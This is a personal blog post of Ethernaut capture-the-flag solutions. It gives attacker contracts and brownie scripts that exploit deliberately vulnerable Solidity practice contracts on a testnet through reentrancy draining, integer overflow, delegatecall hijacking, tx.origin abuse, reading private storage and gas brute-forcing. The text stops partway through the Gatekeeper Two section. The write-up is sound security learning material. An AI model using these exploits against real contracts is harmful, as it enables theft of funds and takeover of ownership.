# Ethernaut solutions

<link rel="stylesheet" href="/articles/ethernaut_solutions/postStyles.css">

<div class="text-center pb-3 sm:pb-4">
  <span class="font-black"><b>July 6th, 2022</b></span>
</div>

In an effort to learn and understand Solidity, to either code contracts or audit them in the future (not sure what I want to do yet), I decided to solve the Ethernaut challenges. 

These were fun, engaging challenges that allowed me to learn some details, vulnerabilities and intricacies of the EVM and the Solidity programming language. Probably one of the most fun learning experiences I've had.

In this article I will basically copy-paste all my solution write-ups from the [github repo](https://github.com/dreth/Ethernaut) where I uploaded all of them. 

I solved these initially in a local brownie (smart contract development framework on python) using a local fork of the rinkeby test network. After solving each challenge, I then ran the scripts that would perform the transactions on the test network itself to solve the challenges. 

If you want to reproduce the same environment I used for it, you can do so by following the instructions in the [readme of that same github repo](https://github.com/dreth/Ethernaut/blob/main/README.md). 

***

## Article index

- [Ethernaut solutions](#ethernaut-solutions)
  - [Article index](#article-index)
  - [Hello Ethernaut](#hello-ethernaut)
    - [Submission transaction](#submission-transaction)
  - [Fallback](#fallback)
    - [Objectives](#objectives)
      - [Solution](#solution)
    - [How I did it](#how-i-did-it)
    - [Submission transaction](#submission-transaction-1)
  - [Coin Flip](#coin-flip)
    - [Objectives](#objectives-1)
      - [Solution](#solution-1)
    - [How I did it](#how-i-did-it-1)
    - [Submission transaction](#submission-transaction-2)
    - [Minor tweaks](#minor-tweaks)
  - [Telephone](#telephone)
    - [Objectives](#objectives-2)
      - [Solution](#solution-2)
    - [How I did it](#how-i-did-it-2)
    - [Submission transaction](#submission-transaction-3)
  - [Token](#token)
    - [Objectives](#objectives-3)
      - [Solution](#solution-3)
      - [How I did it](#how-i-did-it-3)
    - [Submission transaction](#submission-transaction-4)
  - [Delegation](#delegation)
    - [Objectives](#objectives-4)
      - [Solution](#solution-4)
    - [How I did it](#how-i-did-it-4)
    - [Submission transaction](#submission-transaction-5)
  - [Force](#force)
    - [Objectives](#objectives-5)
      - [Solution](#solution-5)
    - [How I did it](#how-i-did-it-5)
    - [Submission transaction](#submission-transaction-6)
  - [Vault](#vault)
    - [Objectives](#objectives-6)
      - [Solution](#solution-6)
    - [How I did it](#how-i-did-it-6)
    - [Submission transaction](#submission-transaction-7)
  - [King](#king)
    - [Objectives](#objectives-7)
      - [Solution](#solution-7)
    - [How I did it](#how-i-did-it-7)
    - [Submission transaction](#submission-transaction-8)
  - [Re-entrancy](#re-entrancy)
    - [Objectives](#objectives-8)
      - [Solution](#solution-8)
    - [How I did it](#how-i-did-it-8)
    - [Submission transaction](#submission-transaction-9)
  - [Elevator](#elevator)
    - [Objectives](#objectives-9)
      - [Solution](#solution-9)
    - [How I did it](#how-i-did-it-9)
    - [Submission transaction](#submission-transaction-10)
  - [Privacy](#privacy)
    - [Objectives](#objectives-10)
      - [Solution](#solution-10)
    - [How I did it](#how-i-did-it-10)
    - [Submission transaction](#submission-transaction-11)
  - [Gatekeeper One](#gatekeeper-one)
    - [Objectives](#objectives-11)
      - [Solution](#solution-11)
    - [How I did it](#how-i-did-it-11)
    - [Submission transaction](#submission-transaction-12)
  - [Gatekeeper Two](#gatekeeper-two)
    - [Objectives](#objectives-12)
      - [Solution](#solution-12)
    - [How I did it](#how-i-did-it-12)
    - [Submission transaction](#submission-transaction-13)
  - [Naught Coin](#naught-coin)
    - [Objectives](#objectives-13)
      - [Solution](#solution-13)
    - [How I did it](#how-i-did-it-13)
    - [Submission transaction](#submission-transaction-14)
  - [Preservation](#preservation)
    - [Objectives](#objectives-14)
      - [Solution](#solution-14)
    - [How I did it](#how-i-did-it-14)
    - [Submission transaction](#submission-transaction-15)
  - [Recovery](#recovery)
    - [Objectives](#objectives-15)
      - [Solution](#solution-15)
    - [How I did it](#how-i-did-it-15)
    - [Submission transaction](#submission-transaction-16)
  - [Magic Number](#magic-number)
    - [Objectives](#objectives-16)
      - [Solution](#solution-16)
    - [How I did it](#how-i-did-it-16)
    - [Submission transaction](#submission-transaction-17)
  - [Alien Codex](#alien-codex)
    - [Objectives](#objectives-17)
      - [Solution](#solution-17)
    - [How I did it](#how-i-did-it-17)
    - [Submission transaction](#submission-transaction-18)
  - [Denial](#denial)
    - [Objectives](#objectives-18)
      - [Solution](#solution-18)
    - [How I did it](#how-i-did-it-18)
    - [Submission transaction](#submission-transaction-19)
  - [Shop](#shop)
    - [Objectives](#objectives-19)
      - [Solution](#solution-19)
    - [How I did it](#how-i-did-it-19)
    - [Submission transaction](#submission-transaction-20)
  - [Dex](#dex)
    - [Objectives](#objectives-20)
      - [Solution](#solution-20)
      - [First swap](#first-swap)
      - [Second swap](#second-swap)
      - [Third swap](#third-swap)
      - [Balances at each swap](#balances-at-each-swap)
    - [How I did it](#how-i-did-it-20)
    - [Submission transaction](#submission-transaction-21)
  - [Dex Two](#dex-two)
    - [Objectives](#objectives-21)
      - [Solution](#solution-21)
    - [How I did it](#how-i-did-it-21)
    - [Submission transaction](#submission-transaction-22)
  - [PuzzleWallet](#puzzlewallet)
    - [Objectives](#objectives-22)
      - [Solution](#solution-22)
    - [How I did it](#how-i-did-it-22)
    - [Submission transaction](#submission-transaction-23)
  - [Motorbike](#motorbike)
    - [Objectives](#objectives-23)
      - [Solution](#solution-23)
    - [How I did it](#how-i-did-it-23)
    - [Submission transaction](#submission-transaction-24)
  - [DoubleEntryPoint](#doubleentrypoint)
    - [Objectives](#objectives-24)
      - [Solution](#solution-24)
    - [How I did it](#how-i-did-it-24)
    - [Submission transaction](#submission-transaction-25)

***

## Hello Ethernaut

The first challenge consists of following a set of instructions given by the contract itself by running some functions.

This is simply an introductory lesson to understand, conceptually, how the Ethernaut challenge is done.

### Submission transaction

Block explorer: https://rinkeby.etherscan.io/tx/0x2b290d63d3cf40543bd01923b495c812e6b830fb624769e650d7c48ad7999fde

***

## Fallback

### Objectives

1. you claim ownership of the contract

2. you reduce its balance to 0

#### Solution

There's two ways to become owner in this contract:

* By contributing (using `contribute()`) a total amount larger than the contributions of the deployer, which are a total of 1000 ETH deposited in individual transactions of less than 0.001 ETH. It would take 1000001 to 1000002 transactions depositing 0.000999999 ETH every time.

* By performing the following steps:

1. Call the `contribute()` function with a value lower than 0.001 ETH.

2. Now that our contribution is larger 0, we can then send ETH to the contract with a value larger than 0 and we will become owner through the `receive()` function.

3. We have now become owner and can call the `withdraw()` function to drain the contract's funds.

### How I did it

1. Contribute 0.0009 ETH calling the `contribute()` function.

```python
fallback.contribute(_from | {'value':0.0009*1e18})
```

Block explorer: https://rinkeby.etherscan.io/tx/0x90f854f08883f751c631d7829ccc0ee0386cfc42ee561fb2e0f088680e369f6f

1. Send the contract 0.0009 ETH

```python
acc.transfer(fallback, 0.0009*1e18)
```

Block explorer: https://rinkeby.etherscan.io/tx/0x45d02df610de828edff7ee0b80bfee2fa4ac1057ff6bc78ef1c7a2c0875bd26f

2. Call the `withdraw()` function

```python
fallback.withdraw(_from)
```

Block explorer: https://rinkeby.etherscan.io/tx/0xbbe13aecf3cf7793f032a845bdff886eae1a77d7bc95081b90113cd73a07852a

### Submission transaction

Block explorer: https://rinkeby.etherscan.io/tx/0x27e316034f676e3c00c0de9159e12d7441cca833d9a7bf29b366ef835c7dbb86


***
## Coin Flip


### Objectives

"To complete this level you'll need to use your psychic abilities to guess the correct outcome 10 times in a row."

#### Solution

Generating pseudo-random numbers that are completely unpredictable is a difficult problem within the blockchain. Predicting a coinflip should have a risk of failing of at least 50%, but if we know what factors are used to generate this pseudo-random number, then we can predict the coinflip accurately with a higher probability of success than the intended 50%.

In this case we can _always_ be right, given that there's 2 factors that generate the coinflip:

1. The variable FACTOR

```js
uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
```

2. The block hash of the previous block to the coinflip converted to integer

```js
uint256 blockValue = uint256(blockhash(block.number.sub(1)));
```

Our coinflip is floor of the ratio between `blockValue` and `FACTOR`

```js
uint256 coinFlip = blockValue.div(FACTOR);
bool side = coinFlip == 1 ? true : false;
```

The problem is then solved by creating an attacker contract that uses the same logic to generate coinflips, but instead to make the guess. Then the guess is plugged into the `flip()` function. 

```js
function callFlip() external {
    uint256 factor = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    uint256 blockVal = uint256(blockhash(block.number - 1));
    uint256 division = blockVal / factor;
    bool guess = division == 1 ? true : false;
    coinFlipContract.flip(guess);
}
```

### How I did it

I did exactly what I described in the [solution section](#solution-1), but I inherited from Ownable to create the `CoinFlipAttack` contract as a way to restrict calling the `callFlip()` function only from the deployer of the attacker contract. After coding the contract I did the following steps:

1. Deploy (at: `0xA8834Cc6c91bf94d4FB32D72815C2011CC1c2e15`) the attacker contract which I labeled `CoinFlipAttack.sol`

```python
coinflipattack = CoinFlipAttack.deploy(_from)
```

2. Set the instance of the contract with which to interface. My contract instance of CoinFlip, in address `0x7BDa91C53648D2a17352e4055fe6834FAABbFc95` on the Rinkeby test network.

```python
coinflipattack.setInstance('0x7BDa91C53648D2a17352e4055fe6834FAABbFc95', _from)
```

Block explorer: https://rinkeby.etherscan.io/tx/0xff97c5818da48c97f36a10a7a4fe54219744bcd6c3b2d56dcb232e6b58b95249

3. Run a loop of 10 iterations calling the `callFlip()` function, which will _always_ be right in its prediction.

```python
for _ in range(10):
    coinflipattack.callFlip(_from | {'allow_revert':True})
```

First tx: Block explorer: https://rinkeby.etherscan.io/tx/0xdc681c4c668321064d661fdb4a256bcff495460a897a1367f6d6180258456ab7

Last tx: Block explorer: https://rinkeby.etherscan.io/tx/

4. Check that we have actually won 10 times in a row by checking the `consecutiveWins` variable in the CoinFlip contract.

```python
wins_assertion = coinflip.consecutiveWins() == 10
print(wins_assertion)
```

### Submission transaction

Block explorer: https://rinkeby.etherscan.io/tx/0x137421ce33d24463170860b734fc5fe256c35479e0d53075e491c9112ad7dd34

### Minor tweaks

In order for the `callFlip()` transactions to go through, I had to increase the gas limit for live networks on my brownie config file:

```yaml
networks:
  live:
    gas_limit: "1000000"
```

And also use the parameter `{'allow_revert':True}` when calling `callFlip()`, as that scenario is a possibility in the definition of `flip()` on CoinFlip if the previous block hash matches the next block hash, I guess in order to avoid making multiple guess attempts in the same block.

```python
coinflipattack.callFlip(_from | {'allow_revert':True})
```
***

## Telephone

### Objectives

Claim ownership of the contract to complete this level.

#### Solution

The function `changeOwner()` compares whether the address that sends the tx (`tx.origin`) is the same as the address that interacts with the contract (`msg.sender`). In this case it isn't, so the owner is changed as per the function's instructions:

```js
function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
        owner = _owner;
    }
}
```

Therefore, the only thing needed here is a attacking contract which interacts with the original Telephone contract. This way the contract is the `msg.sender` while the address that interacts with the attacking contract is the `tx.origin`.

### How I did it

1. I deployed the contract `TelephoneAttack` (at: `0x756a2E146F4f9659E7c16a90948A09aB09925F19`) which interfaces with the original Telephone contract and calls its `changeOwner()` function as follows:

```js
function callChangeOwner(address _newOwner) external {
    telephoneContract.changeOwner(_newOwner);
}
```

where `_newOwner` is the address we want to assign as new contract owner for the Telephone contract.

2. Set the instance address and call the function with my account address from which I deployed the attacking contract:

```python
telephoneattack.callChangeOwner(acc.address, _from)  
```

Block explorer: https://rinkeby.etherscan.io/tx/0x20ffc17549522276816942656e14c9fe459064afd3f99e0f851ca555cfb64711

3. Check that we're the new owner

```python
owner_assertion = telephone.owner() == acc.address
print(f'The account owner matches my address: {owner_assertion}')
```

### Submission transaction

Block explorer: https://rinkeby.etherscan.io/tx/0x7c11bb8f65a6117b8f2e17622f3bbdcc81214b8d5daafa41bbbeb54dfc60e4b5

***

## Token

### Objectives

The goal of this level is for you to hack the basic token contract below.

You are given 20 tokens to start with and you will beat the level if you somehow manage to get your hands on any additional tokens. Preferably a very large amount of tokens.

#### Solution

This contract is using the solidity compiler version 0.6.0, therefore mathematical operations can lead to overflows. In this case, the vulnerability occurs when attempting to call the `transfer()` function:

```js
function transfer(address _to, uint _value) public returns (bool) {
    require(balances[msg.sender] - _value >= 0);
    balances[msg.sender] -= _value;
    balances[_to] += _value;
    return true;
}
```

The line `require(balances[msg.sender] - _value >= 0);` checks if the user balance is larger than or equal to zero, but since balances are unsigned integers, when the number we subtract (`_value`) is larger than the wallet's balance (`balances[msg.sender]`) of the token, an overflow occurs and the wallet's balance becomes the largest unsigned integer minus the difference between these two values. 

After passing the require statement, there is another mistake where this overflowed value is assigned to the balance of `msg.sender`:

```js
balances[msg.sender] -= _value;
```

All we have to do to exploit the contract is call the transfer function as follows:

```js
transfer('any address except the sending address', 21)
```

From the address whose funds we want to cause the overflow on.

#### How I did it

1. I called the `transfer()` function and sent 21 tokens (1 more than the original 20 to cause an overflow) to the contract address of the Token contract.

```js
token.transfer(EthernautContractAddresses['token'], 21, _from)
```

Block explorer: https://rinkeby.etherscan.io/tx/0x36f92045c9515a41a0abe02f0f98dbcb1b11b1b30cf09f55f029393426fe8662

2. Check that we have actually caused an overflow by checking if our balance is above 20.

```python
amount_assertion = token.balanceOf(acc.address) > 20
print(f'Does address {acc.address} have more than 20 tokens?: {amount_assertion}')
```


### Submission transaction

Block explorer: https://rinkeby.etherscan.io/tx/0x50dacc40fa0b3e919a98709ae45ac9efcb9c6d4bb2ec5248176b0aefa158c58a


***

## Delegation

### Objectives

The goal of this level is for you to claim ownership of the instance you are given.

#### Solution

The contract Delegate defines the function `pwn()` which easily allows you to take control of the contract. However, to take control of the Delegation contract, we must call this `pwn()` function through a low level delegate call where we pass the `pwn()` function encoded through the data sent in a transaction that will trigger the `fallback()` function of the Delegation contract.

The ownership can be taken by performing a transfer of 0 wei (or low level `call.data`) to the Delegation contract with `0xdd365b8b` in the message data. These are the first 4 bytes of the SHA-3 hash for the text `'pwn()'`.

### How I did it

1. Obtain the SHA-3 hash for the text `'pwn()'` using `web3.sha3()` from web3.py and extract the first 4 bytes of the hash.

```python
pwn_bytes = web3.sha3(text='pwn()').hex()[0:10]
```

2. Perform a simple transfer with a value of 0 but including the bytes in the tx data.

```python
acc.transfer(to=delegation.address, amount=0, data=pwn_bytes)
```

Block explorer: https://rinkeby.etherscan.io/tx/0xe258aaa31a241c776693da995e11fc3fa0c9777b7e88cc6820767e3f6a914e91

3. Check whether we are owner or not

```python
owner_assertion = delegation.owner() == acc.address
print(f'The owner of the contract is {acc.address}, therefore the assertion is {owner_assertion}')
```

### Submission transaction

Block explorer: https://rinkeby.etherscan.io/tx/0x69562563ddeb59bc8beeb241403bf8406fd9bdb7e4534f940052012f01f228ea

***

## Force

### Objectives

The goal of this level is to make the balance of the contract greater than zero.

#### Solution

From my research, there's several ways of sending funds to a contract that has no `payable` methods:

1. Send funds to the address the contract will be deployed in, because contract addresses are deterministic.

2. Send funds to the contract by destroying of another contract, which sends all of its balance through `selfdestruct(<destination>)`.

3. By making it the recipient of a block reward, which can't be rejected.

Because the instance of the Force contract is already deployed, the easiest way we can complete the objective is through number 2.

### How I did it

1. Deploy an attacking contract called ForceAttack (at: `0xba2C7CAE436F3710500507d1f5cf07229C3d0C66`)

```python
forceattack = ForceAttack.deploy(_from)
```

And make sure the contract can receive funds and also has a function that calls `selfdestruct()` to the contract address of our instance:

```js
function reload() external payable {}

function forceEtherIntoAddress(address payable _to) external onlyOwner {
    selfdestruct(_to);
}
```

I also optionally added a fallback `receive()` function and made the contract `Ownable` so that only I could call the `selfdestruct()` function (not that anyone would've done it anyway...)

2. Send some funds into the contract.

```python
forceattack.reload({'value': 1000} | _from)
```

Block explorer: https://rinkeby.etherscan.io/tx/0xcd6a2d6d2e618742a61f919924ac1093fc92b942ee6b22ce95f5961505b9df49

3. Call the function that calls `selfdestruct()` designating my instance address as the recipient of the funds.

```python
forceattack.forceEtherIntoAddress(force.address)
```

Block explorer: https://rinkeby.etherscan.io/tx/0x936c5b1b5131c445f80eb7e38c1d1c766e8134a06c07613b07a7524f33da0faa

4. Confirm that the contract balance is > 0

```python
balance_assertion = force.balance() > 0
print(f'Current balance of the contract is {force.balance()}, is this greater than zero: {balance_assertion}')
```

### Submission transaction

Block explorer: https://rinkeby.etherscan.io/tx/0xef8a1831aa8bec120b9c1fc966b254dc296a8f6eb23a72cf28545958fd0a07b2

***

## Vault

### Objectives

Unlock the vault to pass the level!

#### Solution

Sensitive data like passwords are not safe to store on the blockchain. Even in private variables, *Especially* if we have the source code of the contract, which is likely to be public in order to increase transparency and confidence in the piece of software, as the blockchain deals with actual money and as users we should always assume a closed source contract is trying to steal our funds.

In this case, the state variables are stored in the contract storage, and because the variable `password` is a 32 byte piece of data, it will always fill an entire slot, making its position very predictable in the 2nd slot of the contract, as the 2nd state variable defined.

In this case, we can easily use the function `get_storage_at()` on web3.py to see what the password is by looking up in the 2nd storage slot. Then we can optionally convert it to text to see what the password is. In this case, the password is:

```python
>>> web3.toText(web3.eth.get_storage_at(vault.address, '0x01').hex())
'A very strong secret password :)'
```

### How I did it

1. Get the password from the contract's storage

```python
password = web3.eth.get_storage_at(EthernautInstances['vault'], '0x01')
```

2. Unlock the vault using the password

```python
vault.unlock(password, _from)
```

Block explorer: https://rinkeby.etherscan.io/tx/0x03ec2e81ed977af2394d251f6fba6f25af30fb36bbcaaa98e59f04c40a57c81f

3. Check if the vault is locked through the `locked` state variable

```python
locked_assertion = vault.locked() == False
print(f'Is the vault unlocked? {locked_assertion}')
```

### Submission transaction

Block explorer: https://rinkeby.etherscan.io/tx/0xfc76f78a068bb6b02333b7c64024f7416c658feeea3ac2fd6e51217db3b138c3

***

## King

### Objectives

When you submit the instance back to the level, the level is going to reclaim kingship. You will beat the level if you can avoid such a self proclamation.

#### Solution

Here all we have to do is have a contract become `king` as opposed to an ordinary address. So we create a contract that performs a low level call to send the funds (because `transfer` would run out of gas) to the King contract. The amount to send has to be greater than or equal to 0.001 ETH (1e15 wei). Once the contract takes over as king, no other contract or address can take over.

### How I did it

1. Deploy the attacking contract KingAttack (at: `0x27eb59A15364a45a53AcB341514e0fcAf44BF0Ad`)

```python
kingattack = KingAttack.deploy(EthernautInstances['king'], _from)
```

2. Call the `becomeKing()` function, while sending enough funds to take over the contract (1e15 wei = 0.001 ether) defined in the contract as follows:

```js
function becomeKing() external payable {
    (bool success,) = address(kingContract).call{value: msg.value}("");
    require(success, "Transfer failed.");
}
```

Calling it in python, we get the value directly from the King contract's storage position 2, where the prize is located (located in position 2 because it is a uin256 which occupies a full slot and the first slot is occupied by an address, also 32 bytes).

```python
kingattack.becomeKing({'value':int(web3.eth.get_storage_at(king.address, '0x01').hex(),16)} | _from)
```

Block explorer: https://rinkeby.etherscan.io/tx/0xcb97566e0e4fbd7658eb587ba7d7418d54ce86830542dd567c23f73cb1b46873

3. Check that we have actually become King

```python
king_assertion = king._king() == kingattack.address
print(f'The contract address {kingattack.address} is the king: {king_assertion}')
```

With the prior knowledge that the contract cannot be taken over by a normal address or another contract, we have effectively broken the takeover mechanism.

### Submission transaction

Block explorer: https://rinkeby.etherscan.io/tx/0x9124cf8bb5f0bc17806a8264443ac0b5a3b9ea22a49818af9d1205be9dbb6aec


***

## Re-entrancy

### Objectives

The goal of this level is for you to steal all the funds from the contract.

#### Solution

the Reentrance contract seems to only expect non-contract addresses to interact with it. When calling `donate()` through a contract and donating an amount of ETH, we can then call `withdraw()` and have another call to `withdraw()` as a fallback function where we attempt to withdraw the same amount that was sent during the donation. This allows our contract to withdraw once again from the Reentrance contract before it can actually update its balance, leading to a net loss of funds equal to the amount that was donated _per transaction_. If the contract had a larger amount of funds, we could basically repeat this same transaction as long as it is gas-efficient to do so and eventually deplete the contract's funds.

### How I did it

1. Code and deploy a contract (at: `0xe2F7Cc547AE5F07C06DA81837877F0056Fb23B6a`) with 4 functions, one to donate, another one to withdraw and a last one being a fallback function that can receive funds `receive()`. The fallback function will call the `withdraw()` method from the Reentrance contract. Additionally, a 4th function that withdraws the attacking contract's funds back to the deployer.

2.We repeat the donate --> withdraw process until the contract has been drained. In this case, the contract had a total of 0.001 ETH (1e15 wei) in it, so it can be done in a single loop. Despite this, I still wanted to use a while loop for illustrative/learning purposes.

```python
while reentrancy.balance() > 0:
    reentrancyattack.donate({'value': 1e15} | _from)
    reentrancyattack.withdraw(1e15, _from)
```

Block explorer: https://rinkeby.etherscan.io/tx/0x8382be6a150e53084ef3dddd1eddb2947f67f06ef78462762bee0da5e4706c92

Block explorer: https://rinkeby.etherscan.io/tx/0xfd45877eea70901376b99b2bee25d924696adbe6cf3fa88aae2d9a58f579884e

3. Recover the funds from the attacker contract and send them to the deployer (owner, me)
   
```python
reentrancyattack.withdrawAttackerContractFunds(_from)
```

Block explorer: https://rinkeby.etherscan.io/tx/0xbe8c59fba36d2911e1a82c38ad9b6b1790688af717a195cdc7de4270eeb71526


4. Check if the contract has indeed been drained.

```python
balance_assertion = reentrancy.balance() == 0
print(f"The contract's balance is {reentrancy.balance()}, The contract is {'drained' if balance_assertion else 'not drained'}")
```

### Submission transaction

Block explorer: https://rinkeby.etherscan.io/tx/0xe704da1a83ed2a3ecf4b72876222c46dc65e9fe72b2ab5d4e1be2262698a73b8

***

## Elevator

### Objectives

This elevator won't let you reach the top of your building. Right?

#### Solution

The returning value of `isLastFloor()` must be False for `floor` to change and for `top` to become true. Two ways to do this come to mind:

1. We make our top floor something that isn't 0 (the starting value of `floor`) and we check if `floor` is the number value of the top floor. Then we define the function `isLastFloor()` to return a comparison between the current `floor` and the top floor value.

2. We make a function that sends the elevator to its current floor (0), but we run this function twice, the first time, we make sure that `isLastFloor()` returns false, and then after this only true. This would effectively mean that our top floor is the 0th floor. But during that second run, `top` becomes true.

### How I did it

1. Create and deploy a Building contract (at: `0x970b299cCB253F5b4f58fEbde41Ffe2D2b25F885`) to interact with the Elevator contract where I define the `isLastFloor()` function:

```js
function isLastFloor(uint256) external returns (bool) {
    lastFloorBool = elevatorContract.floor() == topFloor;
    return lastFloorBool;
}
```

And a function to go to the top floor which calls `goTo()` in the elevator contract:

```js
function goToTopFloor() external {
    elevatorContract.goTo(topFloor);
}
```

2. Call the `goToTopFloor()` function which will first see that it's not at the top floor (`floor` is 0 initially), then floor changes and `floor` = `topFloor` and the second time `isLastFloor()` is called returns `true` which is then assigned to `top`.

```python
building.goToTopFloor(_from)
```

Block explorer: https://rinkeby.etherscan.io/tx/0x33bbab0e9b389cf24fb2118f1b07b350e53d8e358c36cbd94a536f9013fa386d

3. Check that `top` is true

```python
top_assertion = elevator.top() == True
print(f'We are at the top floor: {top_assertion}')
```

### Submission transaction

Block explorer: https://rinkeby.etherscan.io/tx/0x88d2597f20efca51b582e9ae46696320ab5fb77ae32aee5dc58a335ced32a9b2

***

## Privacy

### Objectives

Unlock this contract to beat the level.

#### Solution

First, the data in the `data` variable must be retrieved. This can be done by extracting the data from the contract storage as it is on the blockchain. In brownie, this can be done using `web3.eth.get_storage_at()`, with the address of the contract in the first param and the direction of the contract storage slot to look into.

Each slot has a capacity of 32 bytes (256 bits), meaning that data types which actually fill up a 32 byte slot, are going to take up a whole slot, so the following ones roll over to the next slot. If a data type is declared as `uint256` or `bytes32`, it will always occupy a full storage slot, as these types are already 32 bytes in size. 

In the case of the Privacy contract, we know that the relevant piece of data is the last element of the array `data`. Therefore, to extract this, we must determine _where_ this piece of data is, in what storage slot.

This contract's state variables are, in order:

```js
bool public locked = true;
uint256 public ID = block.timestamp;
uint8 private flattening = 10;
uint8 private denomination = 255;
uint16 private awkwardness = uint16(now);
bytes32[3] private data;
```

Therefore, the storage looks a little like this:

| slot number | object                                   | content                                                            |
|-------------|------------------------------------------|--------------------------------------------------------------------|
| 0           | locked                                   | true                                                               |
| 1           | ID                                       | block timestamp                                                    |
| 2           | flattening, denomination and awkwardness | uint16(now), 255, 100                                              |
| 3           | data[0]                                  | 0x64a6f16b073f2385269a71e47d8ae45f47d73172c5c87510274dba78b584bbaa |
| 4           | data[1]                                  | 0x9a8835c8dd1948872493737460934d6db82def5f62b1108323a69dcff6391462 |
| 5           | data[2]                                  | 0x1942e9d3378c23e90a2cc2f45bd4f1ec7f2fd8ed471d58024a3e1efe498c8ec5 |

What we're interested in is the _first 16 bytes of data[2]_, which is (in hex):

```
1942e9d3378c23e90a2cc2f45bd4f1ec
```

So then after acquiring this, all that needs to be done is simply pass it as parameter to `unlock()`, which will cause `locked` to become false.

### How I did it

Exactly as I described in [solution](#solution-10):

1. Get the first 16 bytes of the data in the 5th storage position of the contract instance.

```python
data_2 = web3.toBytes(hexstr=web3.eth.get_storage_at(privacy.address, '0x5').hex())[0:16].hex()
```

2. Pass it to the `unlock()` function

```python 
privacy.unlock(data_2, _from)
```

Block explorer: https://rinkeby.etherscan.io/tx/0x654abd57f4c71ca865d05575f9ff6356aa2940d25541cf2f53347241d6dfb0d3

3. Check that `locked` is false

```python
locked_assertion = privacy.locked() == False
print(f"The contract is unlocked: {locked_assertion}")
```

### Submission transaction

Block explorer: https://rinkeby.etherscan.io/tx/0x3e1f0abea2f84273b9a5c67b7c66562ce86601bd44ef835518ae05489d13ec96


***

## Gatekeeper One

### Objectives

Make it past the gatekeeper and register as an entrant to pass this level.

#### Solution

This contract has 3 modifiers that must be passed in order to make `entrant` the origin of the tx (my address).

1. The transaction calling `enter()` in GatekeeperOne has to be performed by a smart contract, so that `msg.sender` differs from `tx.origin` (address calling the contract that calls `enter()`).
   
2. The remaining gas (`gasleft()`) after the code as ran has to be a multiple of 8191. This can be done my performing an external call to the GatekeeperOne contract where we run the `enter()` function and additionally send both the gas needed to perform the instructions *and* a multiple of 8191. I coded it as follows:

```js
(success,) = address(gko).call{
            gas: additionalGas + 10*8191
        }(abi.encodeWithSignature(
            'enter(bytes8)', 
            _modifiedTxOriginBytes
        ));
```

where:

* `additionalGas` is the gas sent that can vary and 10*8191 is a multiple of 8191
  
* `_modifiedTxOriginBytes` is `tx.origin` modified heavily in order to pass the third check.

3. The check has 3 require statements where we must have a key of type `bytes8` which has certain characteristics in order to pass the require statements. In summary, `_gateKey` will pass if:

* `uint32(uint64(_gateKey))`, `uint16(uint64(_gateKey))` and `uint16(tx.origin)` are equal, but `uint64(_gateKey)` is not.

In order to achieve this, we need to make some changes to `tx.origin` manually:

* Only keep the first 2 bytes: `0x98bCCA1C6023e3F851090e079030da43d9F229d1` --> `0x00000000000000000000000000000000000029d1`

* Add at least one value within the zeros in the 8 byte range so that when we typecast into `uint64`, the second check passes, meaning that we need to add at least one hex number (0-9 or A-F) in any position marked with an X: `0x000000000000000000000000XXXXXXXX000029d1`

### How I did it

1. Code and deploy (at: `0xdcEae9bA04Ddb9Dfd5F9B589A0d8638e739cD01b`) an attacking contract where I create a function that will call `enter()` in the Gatekeeper One smart contract. 
   
The function takes a parameter `address` and then casts it into `uint64` and then into `bytes8` to pass it to `enter()`, as `enter()` takes a `bytes8` parameter.

The second parameter will be a number, it can be a `uint16` as we will deal with small values. This number will be the amount of gas that will be used by instructions in the Gatekeeper One contract call. A multiple of 8191 has to be added to this message call to the amount of additional gas passed through `additionalGas` in order to pass the 2nd check.

```js
function callEnter(address _modifiedTxOrigin, uint16 additionalGas) public returns (bool) {
    // modified tx origin is tx origin with tweaks to pass the require statements in `enter()`
    bytes8 _modifiedTxOriginBytes = bytes8(uint64(_modifiedTxOrigin));
    bool success;

    // send a message call with a specific amount of gas + a multiple of 8191
    (success,) = address(gko).call{
        gas: additionalGas + 10*8191
    }(abi.encodeWithSignature(
        'enter(bytes8)', 
        _modifiedTxOriginBytes
    ));

    // require success
    require(success, 'call failed');

    // return result of the success
    return success;
}
```

2. Modify my address (the `tx.origin`, `0x98bCCA1C6023e3F851090e079030da43d9F229d1`) in order to pass the third check, in this case I used `0x0000000000000000000000000000000A000029d1`. This will pass all checks as described in [solution](#solution-11).

```python
modified_tx_origin = f"0x{'0'*31}A0000{acc.address[-4:]}"
```

3. In order to find the cost of the instructions, I decided to bruteforce the message call until at least one transaction passed and then annotate the typical cost for it. It ended up usually being `211` or `254`. `bruteforce` is a parameter in my function used to solve the challenge, which if `True` will run the loop and execute 200+ txs to find the correct gas to input into `additionalGas`. Once I have the correct gas value, I input it in the else statement and make `bruteforce=False`.

```python
if bruteforce:
    for i in range(100,300,1):
        try:
            tx = gkoattack.callEnter(modified_tx_origin, i, _from)
            print(f"Correct gas: {i}")
            break
        except:
            continue
else:
    tx = gkoattack.callEnter(modified_tx_origin, 211, _from)
```

Block explorer: https://rinkeby.etherscan.io/tx/0x669160ac98274574e76bbe0128e17e845014bf02f7a58ba956d308871f3ffb96


4. Check if we are `entrant`

```js
entrant_assertion = gatekeeper.entrant() == acc.address
print(f"Address is entrant: {entrant_assertion}")
```

### Submission transaction

Block explorer: https://rinkeby.etherscan.io/tx/0x198d705849071054badc7f1648851deb96f216110571ffba7bb87c5f5cb24835

***

## Gatekeeper Two

### Objectives

Register as an entrant to pass this level.

#### Solution

As with Gatekeeper One, we have to successfully pass 3 modifier checks for the function `enter()` in order to make `entrant` our address.

In my opinion, this problem is significantly easier than Gatekeeper One, as the checks to pass are much easier and faster to code and are found much easier through google searches of concepts with very little reading required.

The checks are as follows:

1. The transaction has to be sent from a contract so that the contract address (`msg.sender`) differs from the contract caller (`tx.origin`).

2. The result of running the solidity assembly opcode `extcodesize()` on the function caller returns how long the caller contract code is, however, when we perform the external call from the constructor of the contract calling, `extcodesize()` returns zero because a contract does not have source code available during construction. [This page](https://consensys.github.io/smart-contract-best-practices/development-recommendations/solidity-specific/extcodesize-checks/) from the Consensys smart contract best practices page details it. Thus `extcodesize()` is NOT a reliable way of checking whether the external call is performed by a contract or an externally owned account. All we have to do here is run the code that calls the `enter()` function from the constructor of our calling contract.

3. The bitwise `XOR` and each element operated through it is its own inverse, so if we have that if:

```js
uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == uint64(0) - 1
```

Is true, then:

```js
